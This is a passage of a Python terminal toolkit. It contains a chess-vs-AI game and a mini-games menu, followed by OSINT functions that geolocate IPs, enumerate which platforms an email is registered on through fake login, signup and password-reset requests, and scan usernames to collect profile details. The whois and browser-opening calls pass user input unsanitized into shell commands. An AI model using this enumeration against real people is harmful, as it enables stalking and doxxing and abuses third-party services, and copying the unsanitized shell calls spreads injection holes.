                return abs(to_row - fr_row) <= 1 and abs(to_col - fr_col) <= 1
            return False
        def in_check(self, color):
            king_pos = None
            for r in range(8):
                for c in range(8):
                    p = self.board[r][c]
                    if (color == 'white' and p == 'K') or (color == 'black' and p == 'k'):
                        king_pos = (r, c)
                        break
                if king_pos: break
            if not king_pos: return False
            kr, kc = king_pos
            for r in range(8):
                for c in range(8):
                    p = self.board[r][c]
                    if (color == 'white' and self.is_black(p)) or (color == 'black' and self.is_white(p)):
                        if self.can_attack(r, c, kr, kc):
                            return True
            return False
        def get_all_moves(self, color):
            moves = []
            for r in range(8):
                for c in range(8):
                    p = self.board[r][c]
                    if (color == 'white' and self.is_white(p)) or (color == 'black' and self.is_black(p)):
                        for tr in range(8):
                            for tc in range(8):
                                if self.is_valid_move_temp(r, c, tr, tc):
                                    moves.append(((r, c), (tr, tc)))
            return moves
        def is_valid_move_temp(self, fr_row, fr_col, to_row, to_col):
            piece = self.board[fr_row][fr_col]
            if piece == ' ': return False
            target = self.board[to_row][to_col]
            if (self.is_white(piece) and self.is_white(target)) or (self.is_black(piece) and self.is_black(target)):
                return False
            if fr_row == to_row and fr_col == to_col: return False
            if piece.lower() == 'p':
                dir = -1 if self.is_white(piece) else 1
                start_row = 6 if self.is_white(piece) else 1
                if to_col == fr_col and to_row == fr_row + dir and target == ' ':
                    return True
                if to_col == fr_col and fr_row == start_row and to_row == fr_row + 2*dir and \
                   self.board[fr_row + dir][fr_col] == ' ' and target == ' ':
                    return True
                if to_col != fr_col and to_row == fr_row + dir and \
                   (target != ' ' or self.en_passant == (to_row, to_col)):
                    return True
                return False
            elif piece.lower() == 'r':
                return (fr_row == to_row or fr_col == to_col) and self.path_clear(fr_row, fr_col, to_row, to_col)
            elif piece.lower() == 'n':
                dr, dc = abs(to_row - fr_row), abs(to_col - fr_col)
                return (dr == 2 and dc == 1) or (dr == 1 and dc == 2)
            elif piece.lower() == 'b':
                return abs(to_row - fr_row) == abs(to_col - fr_col) and self.path_clear(fr_row, fr_col, to_row, to_col)
            elif piece.lower() == 'q':
                return ((fr_row == to_row or fr_col == to_col or abs(to_row - fr_row) == abs(to_col - fr_col)) and
                        self.path_clear(fr_row, fr_col, to_row, to_col))
            elif piece.lower() == 'k':
                if abs(to_row - fr_row) == 2:
                    return False
                return abs(to_row - fr_row) <= 1 and abs(to_col - fr_col) <= 1
            return False
        def make_move_temp(self, fr_row, fr_col, to_row, to_col):
            piece = self.board[fr_row][fr_col]
            captured = self.board[to_row][to_col]
            old_ep = self.en_passant
            self.en_passant = None
            if piece.lower() == 'p' and abs(to_row - fr_row) == 2:
                self.en_passant = (fr_row + (to_row - fr_row)//2, fr_col)
            if piece.lower() == 'p' and fr_col != to_col and captured == ' ' and self.en_passant == (to_row, to_col):
                self.board[fr_row][to_col] = ' '
            self.board[to_row][to_col] = piece
            self.board[fr_row][fr_col] = ' '
            if piece.lower() == 'p' and (to_row == 0 or to_row == 7):
                self.board[to_row][to_col] = 'Q' if self.is_white(piece) else 'q'
        def undo_move_temp(self, fr_row, fr_col, to_row, to_col, captured, was_ep, ep_pos):
            piece = self.board[to_row][to_col]
            self.board[fr_row][fr_col] = piece
            self.board[to_row][to_col] = captured
            if was_ep:
                self.board[fr_row][to_col] = ('p' if self.is_white(piece) else 'P')
            self.en_passant = ep_pos
        def evaluate_board(self):
            piece_value = {'p': 100, 'n': 320, 'b': 330, 'r': 500, 'q': 900, 'k': 20000}
            score = 0
            for r in range(8):
                for c in range(8):
                    p = self.board[r][c]
                    if p == ' ': continue
                    val = piece_value.get(p.lower(), 0)
                    if self.is_white(p):
                        score += val
                    else:
                        score -= val
            return score
        def minimax(self, depth, is_maximizing, alpha, beta):
            if depth == 0:
                return self.evaluate_board()
            if is_maximizing:
                best = float('inf')
                for (fr, to) in self.get_all_moves('black'):
                    fr_row, fr_col = fr
                    to_row, to_col = to
                    piece = self.board[fr_row][fr_col]
                    captured = self.board[to_row][to_col]
                    was_ep = (piece.lower() == 'p' and fr_col != to_col and captured == ' ')
                    old_ep = self.en_passant
                    self.make_move_temp(fr_row, fr_col, to_row, to_col)
                    score = self.minimax(depth - 1, False, alpha, beta)
                    self.undo_move_temp(fr_row, fr_col, to_row, to_col, captured, was_ep, old_ep)
                    best = min(best, score)
                    beta = min(beta, best)
                    if beta <= alpha:
                        break
                return best
            else:
                best = -float('inf')
                for (fr, to) in self.get_all_moves('white'):
                    fr_row, fr_col = fr
                    to_row, to_col = to
                    piece = self.board[fr_row][fr_col]
                    captured = self.board[to_row][to_col]
                    was_ep = (piece.lower() == 'p' and fr_col != to_col and captured == ' ')
                    old_ep = self.en_passant
                    self.make_move_temp(fr_row, fr_col, to_row, to_col)
                    score = self.minimax(depth - 1, True, alpha, beta)
                    self.undo_move_temp(fr_row, fr_col, to_row, to_col, captured, was_ep, old_ep)
                    best = max(best, score)
                    alpha = max(alpha, best)
                    if beta <= alpha:
                        break
                return best
        def ai_move(self):
            print(f"{Y}[~] AI is thinking...{D}")
            moves = self.get_all_moves('black')
            if not moves:
                return None
            best_move = None
            best_score = float('inf')
            for (fr, to) in moves:
                fr_row, fr_col = fr
                to_row, to_col = to
                piece = self.board[fr_row][fr_col]
                captured = self.board[to_row][to_col]
                was_ep = (piece.lower() == 'p' and fr_col != to_col and captured == ' ')
                old_ep = self.en_passant
                self.make_move_temp(fr_row, fr_col, to_row, to_col)
                score = self.minimax(2, False, -float('inf'), float('inf'))
                self.undo_move_temp(fr_row, fr_col, to_row, to_col, captured, was_ep, old_ep)
                if score < best_score:
                    best_score = score
                    best_move = (fr, to)
            return best_move
        def make_move(self, fr_row, fr_col, to_row, to_col):
            piece = self.board[fr_row][fr_col]
            captured = self.board[to_row][to_col]
            self.en_passant = None
            if piece.lower() == 'p' and abs(to_row - fr_row) == 2:
                self.en_passant = (fr_row + (to_row - fr_row)//2, fr_col)
            if piece.lower() == 'p' and fr_col != to_col and captured == ' ' and self.en_passant == (to_row, to_col):
                self.board[fr_row][to_col] = ' '
            self.board[to_row][to_col] = piece
            self.board[fr_row][fr_col] = ' '
            if piece.lower() == 'p' and (to_row == 0 or to_row == 7):
                self.board[to_row][to_col] = 'Q' if self.is_white(piece) else 'q'
            if piece.lower() == 'k':
                if self.is_white(piece):
                    self.king_moved['white'] = True
                else:
                    self.king_moved['black'] = True
            self.turn = 'black' if self.turn == 'white' else 'white'
        def is_valid_move(self, fr_row, fr_col, to_row, to_col):
            piece = self.board[fr_row][fr_col]
            if self.turn == 'white' and not self.is_white(piece):
                return False
            if self.turn == 'black' and not self.is_black(piece):
                return False
            if (self.is_white(piece) and self.is_white(self.board[to_row][to_col])) or \
               (self.is_black(piece) and self.is_black(self.board[to_row][to_col])):
                return False
            original_target = self.board[to_row][to_col]
            original_ep = self.en_passant
            self.board[to_row][to_col] = piece
            self.board[fr_row][fr_col] = ' '
            if piece.lower() == 'p' and fr_col != to_col and original_target == ' ' and self.en_passant == (to_row, to_col):
                self.board[fr_row][to_col] = ' '
            in_check = self.in_check(self.turn)
            self.board[fr_row][fr_col] = piece
            self.board[to_row][to_col] = original_target
            if piece.lower() == 'p' and fr_col != to_col and original_target == ' ' and self.en_passant == (to_row, to_col):
                self.board[fr_row][to_col] = ('P' if self.is_black(piece) else 'p')
            self.en_passant = original_ep
            return not in_check
        def play(self):
            self.print_board()
            while True:
                if self.turn == 'white':
                    print(f"{C}Example move: {G}e2e4{C} (move pawn from e2 to e4){D}")
                    move = input(f"{W}Your move (White): {W}").strip().lower()
                    if move == 'q':
                        return
                    if move == 'undo':
                        if self.move_history:
                            last = self.move_history.pop()
                            self.board[last['from'][0]][last['from'][1]] = last['piece']
                            self.board[last['to'][0]][last['to'][1]] = last['captured']
                            if last['piece'].lower() == 'p' and last['from'][1] != last['to'][1] and last['captured'] == ' ':
                                self.board[last['from'][0]][last['to'][1]] = ('p' if last['piece'].isupper() else 'P')
                            self.turn = 'black'
                            self.print_board()
                        else:
                            print(f"{Y}No moves to undo.{D}")
                            continue
                    if len(move) != 4:
                        print(f"{R}❌ Invalid format!{D} Use example: {G}e2e4{D}")
                        time.sleep(1.5)
                        self.print_board()
                        continue
                    fr = self.pos_to_index(move[:2])
                    to = self.pos_to_index(move[2:])
                    if fr is None or to is None:
                        print(f"{R}❌ Invalid position!{D} Use coordinates like: {G}a1, h8, e4{D}")
                        time.sleep(1.5)
                        self.print_board()
                        continue
                    if not self.is_valid_move(fr[0], fr[1], to[0], to[1]):
                        print(f"{R}❌ Invalid move!{D} Ensure piece is valid and king is not endangered.")
                        time.sleep(1.5)
                        self.print_board()
                        continue
                    self.move_history.append({
                        'from': (fr[0], fr[1]),
                        'to': (to[0], to[1]),
                        'piece': self.board[fr[0]][fr[1]],
                        'captured': self.board[to[0]][to[1]]
                    })
                    self.make_move(fr[0], fr[1], to[0], to[1])
                    self.print_board()
                else:
                    ai_mv = self.ai_move()
                    if ai_mv is None:
                        print(f"{G}✅ AI surrenders. You win!{D}")
                        input(f"\n{C}Press ENTER...")
                        return
                    fr, to = ai_mv
                    self.make_move(fr[0], fr[1], to[0], to[1])
                    ai_notation = self.index_to_pos(fr[0], fr[1]) + self.index_to_pos(to[0], to[1])
                    print(f"{Y}AI plays: {ai_notation}{D}")
                    time.sleep(1.5)
                    self.print_board()
    try:
        game = ChessGameAI()
        game.play()
    except KeyboardInterrupt:
        pass
    input(f"\n{C}Press ENTER...")
def mini_games():
    while True:
        banner()
        print(f"\n{G}[01]{W} 🐍 sssnake")
        print(f"{G}[02]{W} 🔢 Number Guessing")
        print(f"{G}[03]{W} ❌ Tic-Tac-Toe")
        print(f"{G}[04]{W} 💀 Hangman")
        print(f"{G}[05]{W} 🧮 2048")
        print(f"{G}[06]{W} 💣 Minesweeper")
        print(f"{G}[07]{W} ✊ Rock Paper Scissors")
        print(f"{G}[08]{W} 🧩 Sudoku 4×4")
        print(f"{G}[09]{W} ♠ Blackjack")
        print(f"{G}[10]{W} 🧱 Tetris Mini")
        print(f"{G}[11]{W} 🧠 Memory Match")
        print(f"{G}[12]{W} 🔢 15-Puzzle")
        print(f"{G}[13]{W} ⚔️  RPG Mini")
        print(f"{G}[14]{W} ♟️  Chess vs AI")
        print(f"{G}[95]{W} Back")
        print(f"{R}[99]{W} Exit")
        choice = input(f"\n{C}Select: {W}")
        if choice == '1': safe_game_runner(play_sssnake)
        elif choice == '2': safe_game_runner(play_guess_number)
        elif choice == '3': safe_game_runner(play_tictactoe)
        elif choice == '4': safe_game_runner(play_hangman)
        elif choice == '5': safe_game_runner(play_2048)
        elif choice == '6': safe_game_runner(play_minesweeper)
        elif choice == '7': safe_game_runner(play_rps)
        elif choice == '8': safe_game_runner(play_sudoku)
        elif choice == '9': safe_game_runner(play_blackjack)
        elif choice == '10': safe_game_runner(play_tetris_mini)
        elif choice == '11': safe_game_runner(play_memory_match)
        elif choice == '12': safe_game_runner(play_number_puzzle)
        elif choice == '13': safe_game_runner(play_rpg_mini)
        elif choice == '14': safe_game_runner(play_chess_vs_ai)
        elif choice == '95':
            break
        elif choice == '99':
            exit_tool()
        else:
            print(f"{R}[!] Invalid choice.{D}")
            time.sleep(1)
# ======================
# 🔍 INFORMATION GATHERING
# ======================
def trace_ip(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=10)
        data = r.json()
        if data.get('status') != 'success':
            print(f"{R}[!] Failed: {data.get('message', 'Unknown')}")
            input(f"\n{C}Press ENTER...")
            return
        print(f"\n{G}➤ IP           : {W}{data['query']}")
        print(f"{G}➤ Country      : {W}{data['country']} ({data['countryCode']})")
        print(f"{G}➤ City         : {W}{data['city']}")
        print(f"{G}➤ Region       : {W}{data['regionName']}")
        print(f"{G}➤ ISP          : {W}{data['isp']}")
        print(f"{G}➤ Org          : {W}{data['org']}")
        print(f"{G}➤ ASN          : {W}{data['as']}")
        print(f"{G}➤ Coordinates  : {W}{data['lat']}, {data['lon']}")
        print(f"{G}➤ Timezone     : {W}{data['timezone']}")
        print(f"{G}➤ Mobile       : {W}{data['mobile']}")
        print(f"{G}➤ Proxy        : {W}{data['proxy']}")
        print(f"{G}➤ Hosting      : {W}{data['hosting']}")
        print(f"{G}➤ Google Map   : {C}https://maps.google.com/?q={data['lat']},{data['lon']}")
        input(f"\n{C}Press ENTER to return...")  # ✅ FIX: Menunggu ENTER sebelum kembali
    except Exception as e:
        print(f"{R}[!] Error: {e}")
        input(f"\n{C}Press ENTER...")
def ip_by_domain(domain):
    if domain.startswith(('http://', 'https://')):
        domain = domain.split('://')[1].split('/')[0]
    try:
        ip = socket.gethostbyname(domain)
        print(f"\n{G}➤ Domain       : {W}{domain}")
        print(f"{G}✓ IP Found     : {W}{ip}")
        time.sleep(1)
        print(f"\n{Y}[*] Tracing IP location...")
        trace_ip(ip)
    except socket.gaierror:
        print(f"{R}[!] Failed: Invalid domain or resolution error.")
        input(f"\n{C}Press ENTER...")
    except Exception as e:
        print(f"{R}[!] Error: {e}")
        input(f"\n{C}Press ENTER...")
# --- NEW FUNCTION: CHECK EMAIL REGISTRATION ACROSS 50+ PLATFORMS ---
def check_email_registered(email):
    print(f"\n{Y}[~] Scanning registrations across 50+ platforms...{D}")
    local_part = email.split('@')[0].lower()
    domain = email.split('@')[1].lower()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    detected = []
    platforms = {
        "Facebook": {"url": "https://www.facebook.com/login/identify/", "method": "POST", "data": {"email": email}, "success": '"id":"initiate_interstitial"'},
        "Instagram": {"url": "https://i.instagram.com/api/v1/web/accounts/login/ajax/", "method": "POST", "data": {"username": email, "enc_password": "#PWD_INSTAGRAM_BROWSER:0:1700000000:fake"}, "success": '"authenticated":false'},
        "Twitter/X": {"url": "https://twitter.com/account/begin_password_reset", "method": "POST", "data": {"account_identifier": email}, "success": "password reset link"},
        "TikTok": {"url": "https://www.tiktok.com/api/identify/username/check/", "method": "GET", "params": {"username": local_part}, "success": '"uniqueId":"'},
        "LinkedIn": {"url": "https://www.linkedin.com/uas/login-submit", "method": "POST", "data": {"session_key": email, "session_password": "fake123"}, "success": "You can&#8217;t use that password"},
        "Reddit": {"url": "https://www.reddit.com/api/check_username.json", "method": "POST", "data": {"user": local_part}, "success": '"available":false'},
        "Pinterest": {"url": f"https://www.pinterest.com/resource/UserResource/get/?source_url=/%3Fusername%3D{local_part}&data=%7B%22options%22%3A%7B%22username%22%3A%22{local_part}%22%7D%7D", "method": "GET", "success": '"resource":'},
        "Discord": {"url": "https://discord.com/api/v9/auth/register", "method": "POST", "data": {"email": email, "username": "TestUser", "password": "FakePass123!", "consent": True}, "success": "Email already registered"},
        "GitHub": {"url": "https://github.com/signup_check/email", "method": "POST", "data": {"email": email}, "success": "Email already taken"},
        "Bitbucket": {"url": "https://bitbucket.org/account/create/", "method": "POST", "data": {"email": email}, "success": "An account with this email already exists"},
        "StackOverflow": {"url": "https://stackoverflow.com/users/account-recovery", "method": "POST", "data": {"email": email}, "success": "If an account exists"},
        "npm": {"url": f"https://registry.npmjs.org/-/v1/search?text={local_part}&size=1", "method": "GET", "success": '"objects":['},
        "Docker Hub": {"url": f"https://hub.docker.com/v2/users/{local_part}/", "method": "GET", "success": '"username":"'},
        "Steam": {"url": "https://store.steampowered.com/join/checkaccountname/", "method": "POST", "data": {"accountname": local_part}, "success": '"bAvailable":false'},
        "Minecraft": {"url": "https://api.mojang.com/users/profiles/minecraft/" + local_part, "method": "GET", "success": '"id":"'},
        "Xbox Live": {"url": f"https://xboxgamertag.com/search/{local_part}", "method": "GET", "success": "<title>Profile"},
        "ProtonMail": {"url": "https://mail.protonmail.com/api/users/available", "method": "POST", "data": {"Name": local_part}, "success": '"Code":1002'},  # ✅ DIPERBAIKI: hapus spasi di akhir URL
        "PayPal": {"url": "https://www.paypal.com/auth/validatecaptcha", "method": "POST", "data": {"email": email}, "success": "is not associated with a PayPal account"},
        "Binance": {"url": "https://www.binance.com/bapi/accounts/v1/friendly/account/email/check", "method": "POST", "data": {"email": email}, "success": '"success":true'},
        "Spotify": {"url": "https://spclient.wg.spotify.com/signup/public/v1/account", "method": "GET", "params": {"validate": "1", "email": email}, "success": '"status":25'},
        "Netflix": {"url": "https://signup.netflix.com/validatefield", "method": "POST", "data": {"field": "email", "value": email}, "success": "exists"},
        "Amazon": {"url": "https://www.amazon.com/ap/signin", "method": "POST", "data": {"email": email}, "success": "There was a problem"},
        "Telegram": {"url": f"https://t.me/{local_part}", "method": "GET", "success": '<meta property="og:title" content="'},
        "Gravatar": {"url": f"https://en.gravatar.com/{local_part}.json", "method": "GET", "success": '"entry":['},
    }
    for name, cfg in platforms.items():
        if cfg["success"] is None:
            continue
        try:
            url = cfg["url"]
            method = cfg["method"]
            data = cfg.get("data")
            params = cfg.get("params")
            success_str = cfg["success"]
            req_headers = cfg.get("headers", headers)
            if method == "POST":
                r = requests.post(url, data=data, headers=req_headers, timeout=5)
            else:
                r = requests.get(url, params=params, headers=req_headers, timeout=5)
            if name == "PayPal":
                if "not associated" not in r.text:
                    detected.append(name)
            elif success_str in r.text:
                detected.append(name)
        except:
            pass
        time.sleep(0.3)
    if detected:
        print(f"\n{G}✅ Registered on: {W}{', '.join(detected)}{D}")
    else:
        print(f"\n{Y}[-] No registrations found on supported platforms.{D}")
# --- ENHANCED: ANALYZE EMAIL ---
def analyze_email(email):
    if "@" not in email or email.count("@") != 1:
        print(f"{R}[!] Invalid email format (must contain exactly one '@').")
        input(f"\n{C}Press ENTER...")
        return
    local, domain = email.split('@')
    if not local or not domain or "." not in domain:
        print(f"{R}[!] Invalid email format.")
        input(f"\n{C}Press ENTER...")
        return
    print(f"\n{G}➤ Full Email       : {W}{email}")
    print(f"{G}➤ Local Part        : {W}{local}")
    print(f"{G}➤ Domain            : {W}{domain}")
    # Syntax validation
    import re
    local_ok = re.match(r'^[a-zA-Z0-9.!#$%&\'*+/=?^_`{|}~-]+$', local) is not None
    domain_ok = re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', domain) is not None
    syntax_valid = local_ok and domain_ok and len(local) <= 64 and len(domain) <= 255
    if syntax_valid:
        print(f"{G}✓ Syntax Valid      : {W}Valid (RFC 5322)")
    else:
        print(f"{R}❌ Syntax Valid      : {W}Invalid")
    # MX & A record via DoH
    mx_list = []
    has_a = False
    try:
        doh = requests.get(f"https://cloudflare-dns.com/dns-query?name={domain}&type=MX", headers={"accept": "application/dns-json"}, timeout=6)
        if doh.status_code == 200:
            data = doh.json()
            mx_list = sorted([
                answer['data'].split(' ')[1].rstrip('.')
                for answer in data.get('Answer', [])
                if answer.get('type') == 15
            ])
            has_a = bool(socket.gethostbyname(domain))
    except:
        pass
    can_receive = len(mx_list) > 0
    if mx_list:
        print(f"{G}✓ MX Record         : {W}" + ", ".join(mx_list[:3]))
    else:
        print(f"{Y}⚠ MX Record         : {W}Not found")
    # Free provider
    free_providers = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com", "icloud.com", "protonmail.com", "mail.com", "yandex.com", "gmx.com"]
    is_free = domain.lower() in free_providers
    if is_free:
        print(f"{Y}ℹ️  Provider          : {W}Free (high risk for temporary accounts)")
    # Disposable
    disposable_domains = {"tempmail.com", "10minutemail.com", "guerrillamail.com", "mailinator.com", "throwaway.email", "yopmail.com", "getnada.com", "sharklasers.com", "trashmail.com", "dispostable.com"}
    is_disposable = domain.lower() in disposable_domains or "temp" in domain or "fake" in domain
    if is_disposable:
        print(f"{R}⚠️  Disposable Email  : {W}Yes — UNTRUSTWORTHY")
    # Role-based
    role_patterns = ["admin", "root", "webmaster", "hostmaster", "postmaster", "info", "support", "contact", "sales", "noreply", "no-reply", "mailer", "billing"]
    is_role = local.lower() in role_patterns or any(local.lower().startswith(r) for r in ["admin", "support", "info"])
    if is_role:
        print(f"{Y}ℹ️  Role-Based        : {W}Yes (not personal)")
    # Gravatar
    import hashlib
    gravatar_id = hashlib.md5(email.lower().encode()).hexdigest()
    gravatar_url = f"https://www.gravatar.com/avatar/{gravatar_id}?d=404"
    try:
        g = requests.get(gravatar_url, timeout=4)
        has_gravatar = g.status_code == 200
    except:
        has_gravatar = False
    if has_gravatar:
        print(f"{G}✓ Gravatar           : {W}Available")
    # Domain age
    domain_age = "Unknown"
    try:
        whois_raw = os.popen(rf"whois {domain} 2>/dev/null | grep -i 'creation\|created' | head -1").read().strip()
        if whois_raw:
            match = re.search(r'\d{4}-\d{2}-\d{2}', whois_raw)
            if match:
                from datetime import datetime
                created = datetime.strptime(match.group(), "%Y-%m-%d")
                days_old = (datetime.now() - created).days
                if days_old < 30:
                    domain_age = f"{days_old} days (NEW!)"
                    print(f"{Y}🚨 New Domain         : {W}{domain_age}")
                else:
                    domain_age = f"{days_old // 30} months"
    except:
        pass
    # Deliverability score
    score = 100
    if not syntax_valid: score -= 30
    if not can_receive: score -= 40
    if is_disposable: score -= 50
    if is_free: score -= 10
    if is_role: score -= 5
    if score < 0: score = 0
    if score >= 80:
        score_text = f"{G}High (✅)"
    elif score >= 50:
        score_text = f"{Y}Medium (⚠️)"
    else:
        score_text = f"{R}Low (❌)"
    print(f"{G}➤ Deliverability    : {W}{score_text} — Score: {score}/100")
    # Recommendations
    print(f"\n{C}{'='*55}")
    print(f"{C}🔍 RECOMMENDATIONS & RISKS")
    print(f"{C}{'='*55}")
    if is_disposable:
        print(f"• {R}DO NOT trust this email — temporary & anonymous.")
    if not can_receive:
        print(f"• {Y}Email cannot receive messages (no MX record).")
    if is_role:
        print(f"• {Y}Institutional email — not a personal user.")
    if domain_age and "NEW" in domain_age:
        print(f"• {R}New domain: high risk of scam/phishing.")
    # Check registration
    check_email_registered(email)
    # Breach check
    print(f"\n{Y}[~] Select service to check breaches:")
    services = {
        "1": {"name": "Have I Been Pwned", "url": f"https://haveibeenpwned.com/account/{email}", "note": "Automatic check, no login needed"},
        "2": {"name": "BreachDirectory.org", "url": f"https://breachdirectory.org/?func=search&term={email}", "note": "✅ Results shown instantly"},
        "3": {"name": "DeHashed", "url": "https://www.dehashed.com", "note": "Requires account"},
        "4": {"name": "IntelX", "url": "https://intelx.io", "note": "Requires API/login"},
        "5": {"name": "Google Search", "url": f"https://www.google.com/search?q={email}", "note": "Search public web"}
    }
    for key, svc in services.items():
        print(f"{G}[{key}]{W} {svc['name']}")
    choice = input(f"\n{C}Select [1-5]: {W}").strip()
    if choice in services:
        svc = services[choice]
        target_url = svc['url']
        print(f"\n{Y}[i] Service: {svc['name']}")
        print(f"{Y}[i] Note: {svc['note']}")
        print(f"\n{C}🔗 Open the following URL:{W}")
        print(f"\n{target_url}\n")
        if os.path.exists("/data/data/com.termux"):
            if input(f"{Y}Open in browser? (y/n): {W}").lower() == 'y':
                os.system(f"termux-open-url '{target_url}'")
                print(f"{G}[✓] Opening in browser...")
        else:
            print(f"{Y}[i] Copy & paste into your browser.")
    else:
        print(f"{R}[!] Invalid choice.")
        input(f"\n{C}Press ENTER to return...")
# --- ENHANCED: SCAN USERNAME (50+ PLATFORMS + DETAILS) ---
def scan_username(username):
    banner()
    print(f"{Y}[~] Scanning username '{username}' across 50+ platforms...{D}\n")
    if not username or len(username) < 2:
        print(f"{R}[!] Username too short.{D}")
        input(f"\n{C}Press ENTER...")
        return
    headers = {'User-Agent': 'Mozilla/5.0 (Blood-OSINT/2.0; Termux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
    # === QUICK SCAN (50+ PLATFORMS) ===
    quick_scan = {
        "GitHub": f"https://github.com/{username}",
        "GitLab": f"https://gitlab.com/{username}",
        "Bitbucket": f"https://bitbucket.org/{username}/",
        "Reddit": f"https://www.reddit.com/user/{username}/about.json",
        "Twitter/X": f"https://twitter.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}/",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "Pinterest": f"https://www.pinterest.com/{username}/",
        "YouTube": f"https://www.youtube.com/@{username}",
        "Facebook": f"https://www.facebook.com/{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}/",
        "Steam": f"https://steamcommunity.com/id/{username}",
        "Minecraft": f"https://api.mojang.com/users/profiles/minecraft/{username}",
        "Spotify": f"https://open.spotify.com/user/{username}",
        "SoundCloud": f"https://soundcloud.com/{username}",
        "Medium": f"https://medium.com/@{username}",
        "Tumblr": f"https://{username}.tumblr.com",
        "DeviantArt": f"https://{username}.deviantart.com",
        "Gravatar": f"https://en.gravatar.com/{username}.json",
        "Keybase": f"https://keybase.io/{username}",
        "About.me": f"https://about.me/{username}",
        "Flickr": f"https://www.flickr.com/people/{username}/",
        "Vimeo": f"https://vimeo.com/{username}",
        "Imgur": f"https://imgur.com/user/{username}",
        "Behance": f"https://www.behance.net/{username}",
        "Dribbble": f"https://dribbble.com/{username}",
        "Quora": f"https://www.quora.com/profile/{username}",
        "Twitch": f"https://www.twitch.tv/{username}",
        "9GAG": f"https://9gag.com/u/{username}",
        "Pastebin": f"https://pastebin.com/u/{username}",
        "Trello": f"https://trello.com/{username}",
        "Last.fm": f"https://www.last.fm/user/{username}",
        "MyAnimeList": f"https://myanimelist.net/profile/{username}",
        "HackerNews": f"https://news.ycombinator.com/user?id={username}",
        "OK.ru": f"https://ok.ru/{username}",
        "VK": f"https://vk.com/{username}",
        "Telegram": f"https://t.me/{username}",
        "Blogger": f"https://{username}.blogspot.com",
        "Wordpress": f"https://{username}.wordpress.com",
        "Venmo": f"https://account.venmo.com/u/{username}",
        "Roblox": f"https://www.roblox.com/user.aspx?username={username}",
        "Mix": f"https://mix.com/{username}",
        "Giters": f"https://giters.com/{username}",
        "Replit": f"https://replit.com/@{username}",
        "Codepen": f"https://codepen.io/{username}",
        "SourceForge": f"https://sourceforge.net/u/{username}/profile/",
    }
    found_platforms = []
    print(f"{Y}[*] Scanning account existence...{D}")
    for name, url in quick_scan.items():
        try:
            if "reddit.com" in url:
                r = requests.get(url, headers=headers, timeout=5)
                exists = r.status_code == 200 and '"error"' not in r.text
            elif "minecraft" in url:
                r = requests.get(url, timeout=5)
                exists = r.status_code == 200
            elif "gravatar" in url:
                r = requests.get(url, timeout=5)
                exists = r.status_code == 200
            elif name in ["Facebook", "Instagram", "LinkedIn"]:
                r = requests.get(url, headers=headers, timeout=5)
                exists = "404" not in r.text and "not found" not in r.text.lower() and "Page Not Found" not in r.text
            else:
                r = requests.head(url, headers=headers, timeout=5) if "tiktok" not in url else requests.get(url, headers=headers, timeout=5)
                exists = r.status_code == 200
            if exists:
                print(f"{G}[+] {W}{name}: {C}{url}{D}")
                found_platforms.append(name)
            else:
                print(f"{R}[-] {W}{name}: Not found{D}")
        except:
            print(f"{Y}[?] {W}{name}: Failed to load{D}")
        time.sleep(0.15)
    # === SHOW DETAILED DATA (LIKE OLD VERSION) ===
    print(f"\n{C}{'='*55}{D}")
    print(f"{Y}🔍 SHOWING DETAILED DATA FROM FOUND PLATFORMS...{D}")
    # --- GitHub (detail) ---
    if "GitHub" in found_platforms:
        try:
            r = requests.get(f"https://api.github.com/users/{username}", timeout=6)
            if r.status_code == 200:
                data = r.json()
                print(f"\n{G}[+] GitHub: {W}{username}")
                print(f"    Name        : {data.get('name', 'N/A')}")
                print(f"    Bio         : {data.get('bio', 'N/A')}")
                print(f"    Location    : {data.get('location', 'N/A')}")
                print(f"    Public Email: {data.get('email', 'N/A')}")
                print(f"    Blog        : {data.get('blog', 'N/A')}")
                print(f"    Public Repos: {data.get('public_repos', 0)}")
                print(f"    Followers   : {data.get('followers', 0)}")
                print(f"    Account Created: {data.get('created_at', 'N/A')}")
        except:
            pass
    # --- Reddit (detail) ---
    if "Reddit" in found_platforms:
        try:
            r = requests.get(f"https://www.reddit.com/user/{username}/about.json", headers=headers, timeout=6)
            if r.status_code == 200:
                data = r.json()
                created = time.ctime(data['data']['created_utc'])
                print(f"\n{G}[+] Reddit: {W}u/{username}")
                print(f"    Karma       : {data['data'].get('link_karma', 0)}")
                print(f"    Account Created: {created}")
        except:
            pass
    # --- Twitter/X (basic) ---
    if "Twitter/X" in found_platforms:
        try:
            r = requests.get(f"https://twitter.com/{username}", timeout=6)
            if r.status_code == 200:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(r.text, 'html.parser')
                title = soup.find('title')
                if title:
                    title_text = title.text.strip()
                    if " on Twitter" in title_text or " on X" in title_text:
                        display_name = title_text.replace(" on Twitter", "").replace(" on X", "").strip()
                        print(f"\n{G}[+] Twitter/X: {C}https://twitter.com/{username}")
                        print(f"    Display Name: {display_name}")
        except:
            pass
    # --- TikTok (basic) ---
    if "TikTok" in found_platforms:
        print(f"\n{G}[+] TikTok: {C}https://tiktok.com/@{username}")
    # --- Steam (basic) ---
    if "Steam" in found_platforms:
        print(f"\n{G}[+] Steam: {C}https://steamcommunity.com/id/{username}")
    # --- Minecraft (basic) ---
    if "Minecraft" in found_platforms:
        try:
            r = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{username}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                print(f"\n{G}[+] Minecraft: {W}{data.get('name', username)}")
                print(f"    UUID        : {data.get('id', 'N/A')}")
        except:
            pass
    # --- Gravatar (basic) ---
    if "Gravatar" in found_platforms:
        print(f"\n{G}[+] Gravatar: {C}https://en.gravatar.com/{username}")
    # --- Summary ---
    print(f"\n{C}{'='*55}{D}")
    if found_platforms:
        print(f"{G}✅ Total found on: {W}{len(found_platforms)} platforms{D}")
        print(f"{G}Platforms: {W}{', '.join(found_platforms)}")
    else:
        print(f"{Y}ℹ️  Not found on any platform.{D}")
    input(f"\n{C}Press ENTER to return...")
